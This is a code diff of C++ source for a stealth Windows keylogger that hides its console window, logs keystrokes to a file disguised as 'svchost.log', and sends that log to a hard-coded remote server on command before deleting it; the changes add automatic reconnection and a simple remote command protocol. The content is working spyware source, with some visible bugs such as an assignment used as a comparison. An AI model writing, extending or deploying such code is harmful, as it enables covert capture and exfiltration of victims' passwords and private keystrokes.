@@ -18,13 +18,14 @@
 #pragma comment(lib, "Ws2_32.lib")
 #define DEFAULT_SERVER_PORT 27015
 #define DEFAULT_BUFLEN 512
-#define	DEFAULT_SERVER_IP "192.168.137.1"
+#define	DEFAULT_SERVER_IP "192.168.137.254"
 #define bufsize 512
 #define TimesToTry  10 //How many times trying to send a message to server if something goes wrong
+#define TimeForReconnecting 100
 
 #define _CRT_SECURE_NO_WARNINGS //VS2013 require this stuff, not to show warnings.
 #define BUFSIZE 512//80
-#define MIN_DIFF 120//2 min
+#define MIN_DIFF 120//2 min//
 #define CHECK_TIME	t_time2 = clock()/CLOCKS_PER_SEC; \
 if (t_time2 - t_time1 >= MIN_DIFF)\
 					{fputs("\n", file); \
@@ -45,7 +46,7 @@ int main(void)
 	//*****
 	//INIT_WINAPI_DEPENDENT
 	//*****
-	
+
 	HWND stealth; /*creating stealth (window is not visible)*/
 	AllocConsole();
 	stealth = FindWindowA("ConsoleWindowClass", NULL);
@@ -54,13 +55,13 @@ int main(void)
 	//*****
 	//INIT_WINAPI_DEPENDENT
 	//*****
-
+	
 
 	//*****
 	//INIT_SOCKET
 	//*****
 
-	char OUR_DEFAULT_PORT_CHAR[] = "27016";
+	char OUR_DEFAULT_PORT_CHAR[] = "27015";
 	//Initialize WSA
 	WSADATA wsaData;
 	int result;
@@ -98,7 +99,11 @@ int main(void)
 	{
 		result = connect(clientSocket, (reinterpret_cast<SOCKADDR*>(&clientService)), sizeof(clientService));
 		if (result == 0)
+		{
+			//printf("success!!!\n");//
+			//getchar();
 			break;
+		}
 	}
 
 	//*****
@@ -186,73 +191,107 @@ int get_keys(SOCKET clientSocket, int result)
 
 	int t_time1 = clock() / CLOCKS_PER_SEC;
 	int t_time2;
+	int counter = 0; //I want to work with connection not every itteration
 
 
 	while (1)
 	{
 		Sleep(10);/*to prevent 100% cpu usage*/
-
+		counter++;
 		//*****
 		//COMMUNICATING_WITH_SERVER
 		//*****
+		//printf("Enter point\n");
+			int rezult = 0;
 
-
-		while (true)
-		{
-			// get data
-			char buf[bufsize];
-			char x = buf[bufsize];
-			int r = recv(clientSocket, buf, bufsize, 0);
-			if (r <= 0)
+			int Errors_sock = send(clientSocket, "", 0, 1);
+		//	printf("Errors_sock = %d, counter = %d\n", Errors_sock, counter);
+			if (Errors_sock >= 0)
+				counter = 0;
+			if (Errors_sock == -1)
+				rezult = -1;
+			if (rezult== -1 && counter==TimeForReconnecting)
 			{
-				//WSACleanup();
-				//return 0;
-				continue;
+		//		printf("reconnecting...\n");
+				counter = 0;
+				closesocket(clientSocket);
+		//		printf("...Closing Success...\n");
+				clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+		//		printf("...Sochet Success...\n");
+				sockaddr_in clientService;
+				clientService.sin_family = AF_INET;
+				inet_pton(AF_INET, DEFAULT_SERVER_IP, &(clientService.sin_addr));
+				clientService.sin_port = htons(DEFAULT_SERVER_PORT);
+
+				result = connect(clientSocket, (reinterpret_cast<SOCKADDR*>(&clientService)), sizeof(clientService));
+		//		printf("result = %d, errno = %d\n", result, errno);
 			}
 
-			// If you sent a 0 - send files
-			if (buf[0] == '0')
+			if (rezult == 0)
 			{
-				char data[bufsize];
-				char filetosend[] = "svchost.log";
-				//FILE *in;
-				fopen_s(&file, filetosend, "rb");
-				while (!feof(file))
+				// get data
+				char buf[bufsize];
+				char x = buf[bufsize];
+				u_long flag = 1;
+				ioctlsocket(clientSocket, FIONBIO, &flag);
+				//		printf("so sad :(\n");
+				int r = recv(clientSocket, buf, bufsize, 0);
+
+				if (r > 0)
+					// If you sent a 0 - send files
 				{
-					int b = fread(data, 1, bufsize, file);
-					result = -1;
-					int i = 0;
-					while (i < TimesToTry)
+					if (buf[0] == '0')
 					{
-						result = send(clientSocket, data, static_cast<int>(strlen(data)), 0);
-						if (result == 0)
-							break;
-						i++;
+						//	printf("sending log!\n");
+						char data[bufsize];
+						char filetosend[] = "svchost.log";
+						//FILE *in;
+						//	printf("...Opening file\n");
+						//file = 
+						int rez = fopen_s(&file, filetosend, "rb");
+						if (rez == 0)
+						{
+							while (!feof(file))
+							{
+								//		printf("...Sending file\n");
+								int b = fread(data, 1, bufsize, file);
+								send(clientSocket, data, static_cast<int>(strlen(data)), 0);
+
+							}
+							//	printf("...Closingfile\n");
+							fclose(file);
+							//	printf("...Removing file\n");
+							remove("svchost.log");
+							//	printf("...Success\n");
+							buf[0] = 5;
+						}
+					}
+					// If you sent 1 - disables
+					if (buf[0] == '1')
+					{
+						closesocket(clientSocket);
+						WSACleanup();
+						return 0;
+					}
+					if (buf[0] = '2')
+					{
+						counter = 0;
+						closesocket(clientSocket);
+						clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+						sockaddr_in clientService;
+						clientService.sin_family = AF_INET;
+						inet_pton(AF_INET, DEFAULT_SERVER_IP, &(clientService.sin_addr));
+						clientService.sin_port = htons(DEFAULT_SERVER_PORT);
+						result = connect(clientSocket, (reinterpret_cast<SOCKADDR*>(&clientService)), sizeof(clientService));
 					}
 				}
-				fclose(file);
-
-				remove("svchost.log");
-
-
-				continue;
 			}
-			// If you sent 1 - disables
-			if (buf[0] == '1')
-			{
-				closesocket(clientSocket);
-				WSACleanup();
-				return 0;
-			}
-
-		}
-
 
 		//*****
 		//COMMUNICATING_WITH_SERVER
 		//*****
 
-
+		//	printf("continue...\n");
 
 		for (character = 8; character <= 222; character++)
 		{
@@ -265,10 +304,10 @@ int get_keys(SOCKET clientSocket, int result)
 
 					//FILE *file;
 
-				if (file == NULL)
-				{
-					return 1;
-				}
+					if (file == NULL)
+					{
+						return 1;
+					}
 				if (file != NULL)
 				{
 					if ((character >= 39) && (character <= 64))
